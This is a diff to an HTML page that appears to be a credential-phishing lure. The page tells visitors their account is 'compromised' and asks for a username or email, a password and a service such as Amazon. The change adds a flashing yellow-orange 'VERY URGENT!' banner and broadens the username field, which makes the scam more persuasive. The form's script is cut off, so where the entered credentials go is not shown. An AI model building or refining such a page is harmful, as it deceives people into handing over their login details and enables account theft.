@@ -9,13 +9,20 @@
             body {
               background: #bfbfbf;
             }
+            .warning {
+              animation: warning .2s infinite linear;
+            }
+            @keyframes warning {
+              from {color: yellow;}
+              to {color: orange;}
+            }
         </style>
     </head>
     <body>
-      <h1>VERY URGENT!</h1>
+      <h1 class="warning">VERY URGENT!</h1>
       <h3>Your account has been compromised! Please enter credentials to secure your account!</h3>
         <form id="form">
-            <input type="text" id="username" placeholder="Username" />
+            <input type="text" id="username" placeholder="Username or Email" />
             <input type="text" id="password" placeholder="Password" />
             <select id="service" name="Choose Service.">
               <option value="amazon">Amazon</option>
@@ -43,6 +50,7 @@
 
             <button type="submit">Send</button>
         </form>
+
         <script>
             const form = document.getElementById('form');
             
